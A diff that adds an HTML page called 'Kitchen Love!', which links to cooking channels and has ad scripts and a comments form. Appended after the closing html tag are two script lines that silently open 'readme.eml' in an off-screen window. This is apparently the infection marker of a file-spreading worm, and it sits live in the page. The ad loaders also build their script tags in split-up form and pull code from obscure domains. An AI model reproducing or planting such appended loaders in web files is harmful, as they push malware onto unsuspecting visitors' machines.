@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-164222874-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-164222874-1');
+</script>
+
+<title>Kitchen Love!</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="stay4.gif" />
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
+
+<style>
+* {
+  box-sizing: border-box;
+}
+.menu {
+  float: left;
+  width: 20%;
+}
+.menuitem {
+  padding: 8px;
+  margin-top: 7px;
+  border-bottom: 1px solid #f1f1f1;
+}
+.main {
+  float: left;
+  width: 60%;
+  padding: 0 20px;
+  overflow: hidden;
+}
+.right {
+  background-color: lightblue;
+  float: left;
+  width: 20%;
+  padding: 10px 15px;
+  margin-top: 7px;
+}
+
+@media only screen and (max-width:800px) {
+  /* For tablets: */
+  .main {
+    width: 80%;
+    padding: 0;
+  }
+  .right {
+    width: 100%;
+  }
+}
+@media only screen and (max-width:500px) {
+  /* For mobile phones: */
+  .menu, .main, .right {
+    width: 100%;
+  }
+}
+</style>
+<style>
+body,h1,h2,h3,h4,h5 {font-family: "Poppins", sans-serif}
+body {font-size: 16px;}
+img {margin-bottom: -8px;}
+.mySlides {display: none;}
+</style>
+
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif;}
+.w3-sidebar {
+  z-index: 3;
+  width: 250px;
+  top: 43px;
+  bottom: 0;
+  height: inherit;
+}
+
+</style>
+<style>
+body,h1,h2,h3,h4,h5 {font-family: "Poppins", sans-serif}
+body {font-size: 16px;}
+img {margin-bottom: -8px;}
+.mySlides {display: none;}
+</style>
+
+<!comment style>
+
+
+<style>
+
+/* Button used to open the chat form - fixed at the bottom of the page */
+.open-button {
+  background-color: #555;
+  background-image: url('star.gif');
+  color: white;
+  padding: 10px 15px;
+  border: none;
+  cursor: pointer;
+  opacity: 0.9;
+  border-radius: 10px;
+  position: fixed;
+  bottom: 1px;
+  right: 1px;
+  width: 280px;
+
+}
+
+/* The popup chat - hidden by default */
+.chat-popup {
+  display: none;
+  position: fixed;
+  bottom: 0;
+  right: 15px;
+
+  z-index: 999;
+}
+
+/* Add styles to the form container */
+.form-container {
+  max-width: 300px;
+  padding: 10px;
+  background-color: grey;
+  border-radius: 10px;
+}
+
+/* Full-width textarea */
+.form-container textarea {
+  width: 100%;
+  padding: 15px;
+  margin: 5px 0 22px 0;
+  border: none;
+  background: #f1f1f1;
+  resize: none;
+  min-height: 200px;
+}
+
+/* When the textarea gets focus, do something */
+.form-container textarea:focus {
+  background-color: #ddd;
+  outline: none;
+}
+
+/* Set a style for the submit/send button */
+.form-container .btn {
+  background-color: #4CAF50;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom:10px;
+  opacity: 0.8;
+}
+
+/* Add a red background color to the cancel button */
+.form-container .cancel {
+  background-color: red;
+}
+
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
+}
+</style>
+<!comment  style over!>
+<style>
+#myBtn {
+  background-color:orange;
+  background-image: url('confy.gif');
+  border-color:orange;
+  border-radius: 10px;
+  color:black;
+}
+.myBtn {
+
+
+  border-radius: 3px;
+
+}
+</style>
+<!dropdown>
+<style>
+body {margin:0;font-family:Arial}
+
+.topnavy {
+  position: fixed;
+ top: 0;
+ width: 100%;
+}
+</style>
+<!dropdown>
+
+<!dropdown>
+<style>
+body {margin:0;font-family:Arial}
+
+.topnav {
+  overflow: hidden;
+  background-color: #333;
+
+}
+
+.topnav a {
+  float: left;
+  display: block;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+}
+
+.active {
+  background-color: orange;
+  color: white;
+  border-radius: 5px;
+}
+
+.topnav .icon {
+  display: none;
+}
+
+.dropdown {
+  float: left;
+  overflow: hidden;
+}
+
+.dropdown .dropbtn {
+  font-size: 17px;
+  border: none;
+  outline: none;
+  color: white;
+  padding: 14px 16px;
+  background-color: inherit;
+  font-family: inherit;
+  margin: 0;
+}
+
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: yellow;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+    border-radius: 3px;
+}
+
+.dropdown-content a {
+  float: none;
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+
+.topnav a:hover, .dropdown:hover .dropbtn {
+  background-color: #555;
+  color: white;
+}
+
+.dropdown-content a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+@media screen and (max-width: 600px) {
+  .topnav a:not(:first-child), .dropdown .dropbtn {
+    display: none;
+  }
+  .topnav a.icon {
+    float: right;
+    display: block;
+  }
+}
+
+@media screen and (max-width: 600px) {
+  .topnav.responsive {position: relative;}
+  .topnav.responsive .icon {
+    position: absolute;
+    right: 0;
+    top: 0;
+  }
+  .topnav.responsive a {
+    float: none;
+    display: block;
+    text-align: left;
+  }
+  .topnav.responsive .dropdown {float: none;}
+  .topnav.responsive .dropdown-content {position: relative;}
+  .topnav.responsive .dropdown .dropbtn {
+    display: block;
+    width: 100%;
+    text-align: left;
+  }
+}
+</style>
+<!dropdown>
+
+</head>
+<body background="bigbg3.jpg">
+
+
+
+  <! Time To Shhh Withe Kitchen...! >
+
+   <div class="w3-container w3-padding-32 w3w3-hover-orange" id="projects">
+     <h3 class="w3-border-bottom w3-border-light-grey w3-padding-16 w3w3-hover-orange">
+<div align=center>
+         <div class="w3-display-topcenter w3-container w3-amber w3-hover-orange w3-hide-small"
+          style="top:4%;opacity:0.7;width:70%">
+         <h2><b>Time To Shhh Withe Kitchen...!</b></h2>
+       </div>
+
+     </h3>
+   </div>
+<div>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '4b4fa360e74c514bf16000c82bab2f33',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://yy9s51b2u05z.com/4b4fa360e74c514bf16000c82bab2f33/invoke.js"></scr' + 'ipt>');
+</script>
+</div>
+   <div class="w3-row-padding w3-hover-black">
+     <div class="w3-col l3 m6 w3-hover-red w3-margin-bottom">
+       <div class="w3-display-container">
+         <a href="https://www.youtube.com/channel/UCGsvFjXX2mBr3d7auLPg8fg/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">COOKING WITH TINA</div></a>
+         <a href="https://www.youtube.com/channel/UCGsvFjXX2mBr3d7auLPg8fg/videos"target="_blank"> <img src="tina.gif" alt="Cooking With Tina" style="width:300px;height:300px;"></a>
+       </div>
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-blue">
+       <div class="w3-display-container">
+         <a href="https://www.instagram.com/nusr_et/"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">NUSR_ET#SALTBAE</div></a>
+         <a href="https://www.instagram.com/nusr_et/"target="_blank"> <img src="nusr.jpg" alt="SaltBae" style="width:300px;height:300px;"></a>
+       </div>
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-brown">
+       <div class="w3-display-container">
+         <a href="http://raboninco.com/EsFE"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">COOK WITH WEMA SEPETU</div></a>
+         <a href="http://raboninco.com/EsFE"target="_blank"> <img src="wemy.jpg" alt="Cook With Wemy" style="width:300px;height:300px;"></a>
+
+       </div>
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-purple">
+       <div class="w3-display-container">
+         <a href="https://www.youtube.com/channel/UC9UWCQawNBwL1j9TQ4Ydqyw/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">MAPISHI RAISI</div></a>
+         <a href="https://www.youtube.com/channel/UC9UWCQawNBwL1j9TQ4Ydqyw/videos"target="_blank"> <img src="raisi.jpg" alt="Mapishi rahisi" style="width:300px;height:300px;"></a>
+
+       </div>
+     </div>
+   </div>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '4b4fa360e74c514bf16000c82bab2f33',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.hiprofitnetworks.com/4b4fa360e74c514bf16000c82bab2f33/invoke.js"></scr' + 'ipt>');
+</script>
+   <div class="w3-row-padding">
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-yellow">
+       <div class="w3-display-container">
+         <a href="https://www.youtube.com/channel/UCJFp8uSYCjXOMnkUyb3CQ3Q/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">TASTY</div></a>
+         <a href="https://www.youtube.com/channel/UCJFp8uSYCjXOMnkUyb3CQ3Q/videos"target="_blank"> <img src="tasty.jpg" alt="Tasty" style="width:300px;height:300px;"></a>
+        </div>
+
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-pink">
+       <div class="w3-display-container">
+         <a href="https://www.youtube.com/user/TheArtOfCooking/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">THE ART OF COOKING</div></a>
+         <a href="https://www.youtube.com/user/TheArtOfCooking/videos"target="_blank"> <img src="cart.gif" alt="The Art Of Cooking" style="width:300px;height:300px;"></a>
+
+       </div>
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-green">
+       <div class="w3-display-container">
+         <a href=" https://www.youtube.com/channel/UCrN6qn64kRd0ldSucgHpSwA/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">IKA MALLE</div></a>
+         <a href="https://www.youtube.com/channel/UCrN6qn64kRd0ldSucgHpSwA/videos"target="_blank"> <img src="ika.jpg" alt="Ika Malle" style="width:300px;height:300px;"></a>
+       </div>
+     </div>
+     <div class="w3-col l3 m6 w3-margin-bottom w3-hover-orange">
+       <div class="w3-display-container">
+         <a href="https://www.youtube.com/channel/UCcj1hpspM1khZzEPS3YqYaQ/videos"target="_blank"> <div class="w3-display-topleft w3-black w3-padding">TASTY APPETITE</div></a>
+         <a href="https://www.youtube.com/channel/UCcj1hpspM1khZzEPS3YqYaQ/videos"target="_blank"> <img src="tap.jpg" alt="Tasty Appetite" style="width:300px;height:300px;"></a>
+
+       </div>
+     </div>
+   </div>
+   <!comment tainer>
+
+   <button class="open-button" onclick="openForm()">Comments & Complaints</button>
+
+   <div class="chat-popup" id="myForm">
+     <form method="post" action="http://getcomments.000webhostapp.com/" class="form-container">
+       <h1>Express Your Feelings!🤯</h1>
+
+       <label for="name"><b>Name</b></label><br>
+   	  <input type="text" name="name" class="inp" placeholder="Enter Your Name" required><br>
+
+
+       <label for="msg"><b>Message Here🕴</b></label>
+       <textarea placeholder="Type message.." name="msg" required></textarea>
+
+       <button type="submit" class="btn">Send Message</button>
+       <button type="button" class="btn cancel" onclick="closeForm()">Close I'm Done!</button>
+     </form>
+   </div>
+
+   <script>
+   function openForm() {
+     document.getElementById("myForm").style.display = "block";
+   }
+
+   function closeForm() {
+     document.getElementById("myForm").style.display = "none";
+   }
+   </script>
+
+   <!comment tainer outro>
+
+<div>
+<br>
+<div>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '4b4fa360e74c514bf16000c82bab2f33',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://yy9s51b2u05z.com/4b4fa360e74c514bf16000c82bab2f33/invoke.js"></scr' + 'ipt>');
+</script>
+</div>
+
+<!Navbar >
+<div class="topnavy">
+<div class="topnav" id="myTopnav">
+<a href="cooking.html" class="active">Cooking</a>
+<div class="dropdown">
+   <button class="dropbtn">Categories
+    <i class="fa fa-caret-down"></i>
+  </button>
+  <div class="dropdown-content">
+    <a href="iindex.html">Home</a>
+    <a href="cashtemple.html">Money Temple</a>
+      <a href="bored.html">Passion</a>
+ <a href="school.html">Scholarships</a>
+    <a href="movies.html">Movies</a>
+    <a href="hacker.html">Hacking</a>
+ <a href="news.html">News</a>
+    <a href="corona.html">Corona</a>
+    <a href="redemption.html">Redemption</a>
+  </div>
+</div>
+<a href="whatsapp://send?text=https://homeflix9.com" data-action="share/whatsapp/share" class="w3-bar-item w3-black w3-button w3-padding-20 myBtn " >Share via Whatsapp</a>
+<a href="about.html">About</a>
+
+<a href="javascript:void(0);" style="font-size:15px;" class="icon" onclick="myFunction()">&#9776;</a>
+</div>
+</div>
+
+<script>
+function myFunction() {
+var x = document.getElementById("myTopnav");
+if (x.className === "topnav") {
+  x.className += " responsive";
+} else {
+  x.className = "topnav";
+}
+}
+</script>
+
+
+</div>
+</div>
+<div class="w3-bar w3-coral w3-border w3-hover-light-pink">
+  <a href="iindex.html" class="w3-bar-item w3-button w3-blue"><i class="fa fa-home"></i></a>
+  <a href="https://accounts.google.com/ServiceLogin/identifier?hl=en&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession" class="w3-bar-item w3-button"><i class="fa fa-envelope"></i></a>
+  <a href="https://www.google.com/" class="w3-bar-item w3-button"><i class="fa fa-globe"></i></a>
+</div>
+
+</div>
+
+
+
+
+
+<div class="w3-bar w3-tiny w3-black">
+
+    <div class="w3-bar-item">
+        </div><div align="center">
+        <p id="demo"></p>
+
+<script>
+var d = new Date();
+document.getElementById("demo").innerHTML = d;
+</script>
+</div>
+    </div>
+</div>
+
+
+
+
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
